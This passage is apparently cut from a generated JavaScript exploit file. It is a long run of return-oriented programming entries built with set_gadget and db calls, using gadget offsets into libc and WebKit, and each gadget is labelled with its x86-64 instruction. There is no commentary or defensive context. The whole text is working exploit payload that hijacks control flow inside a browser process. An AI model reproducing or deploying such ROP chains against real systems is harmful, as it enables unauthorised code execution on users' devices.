db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+119264, //L1407-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1407:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+119320, //L1410-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1410:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+119392, //L1411-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1411:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+119448, //L1414-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1414:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+119552, //L1417-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1415:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L1417:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+119656, //L1420-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+119640, //L1419-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1419:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1420:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+119800, //L1423-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+119768, //L1421-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+119784, //L1422-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1421:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1422:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1423:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+119872, //L1424-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1424:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+119928, //L1427-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1427:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+120008, //L1428-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1428:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1429:
db([7, 0]); // 0x7
set_gadget(libc_base+757614,); //pop rcx
//L1430:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+120112, //L1431-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+120128, //L1432-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1431:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1432:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222, //pop rsi
ropchain+120216, //L1433-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1433:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+120272, //L1436-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1436:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+120392, //L1439-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1437:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1439:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+120496, //L1442-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+120480, //L1441-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1441:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1442:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+120640, //L1445-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+120608, //L1443-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+120624, //L1444-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1443:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1444:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1445:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+120712, //L1446-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1446:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+120768, //L1449-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1449:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+120848, //L1450-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1450:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1451:
db([31, 0]); // 0x1f
set_gadget(libc_base+757614,); //pop rcx
//L1452:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+120952, //L1453-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+120968, //L1454-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1453:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1454:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+121056, //L1455-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1455:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+121112, //L1458-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1458:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+121184, //L1459-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1459:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+121240, //L1462-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1462:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L1463:
libc_base+467092, //pop rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+121392, //L1466-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1464:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1466:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+121496, //L1469-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+121480, //L1468-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1468:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1469:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+121640, //L1472-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+121608, //L1470-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+121624, //L1471-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1470:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1471:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1472:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+121712, //L1473-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1473:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+121768, //L1476-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1476:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+121848, //L1477-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1477:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1478:
db([32, 0]); // 0x20
set_gadget(libc_base+757614,); //pop rcx
//L1479:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+121952, //L1480-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+121968, //L1481-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1480:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1481:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+122056, //L1482-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1482:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+122112, //L1485-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1485:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+122184, //L1486-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1486:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+122240, //L1489-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1489:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+122344, //L1492-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1490:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1492:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+122448, //L1495-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+122432, //L1494-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1494:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1495:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+122592, //L1498-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+122560, //L1496-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+122576, //L1497-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1496:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1497:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1498:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+122664, //L1499-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1499:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+122720, //L1502-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1502:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+122800, //L1503-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1503:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1504:
db([37, 0]); // 0x25
set_gadget(libc_base+757614,); //pop rcx
//L1505:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+122904, //L1506-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+122920, //L1507-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1506:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1507:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+123008, //L1508-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1508:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+123064, //L1511-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1511:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+123184, //L1514-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1512:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1514:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+123288, //L1517-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+123272, //L1516-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1516:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1517:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+123432, //L1520-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+123400, //L1518-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+123416, //L1519-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1518:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1519:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1520:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+123504, //L1521-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1521:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+123560, //L1524-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1524:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+123640, //L1525-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1525:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1526:
db([33, 0]); // 0x21
set_gadget(libc_base+757614,); //pop rcx
//L1527:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+123744, //L1528-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+123760, //L1529-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1528:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1529:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+123848, //L1530-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1530:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+123904, //L1533-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1533:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+123976, //L1534-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1534:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+124032, //L1537-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1537:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L1538:
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+124184, //L1541-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1539:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1541:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+124288, //L1544-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+124272, //L1543-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1543:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1544:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+124432, //L1547-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+124400, //L1545-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+124416, //L1546-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1545:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1546:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1547:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+124504, //L1548-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1548:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+124560, //L1551-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1551:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+124640, //L1552-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1552:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1553:
db([34, 0]); // 0x22
set_gadget(libc_base+757614,); //pop rcx
//L1554:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+124744, //L1555-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+124760, //L1556-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1555:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1556:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+124848, //L1557-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1557:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+124904, //L1560-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1560:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+124976, //L1561-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1561:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+125032, //L1564-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1564:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
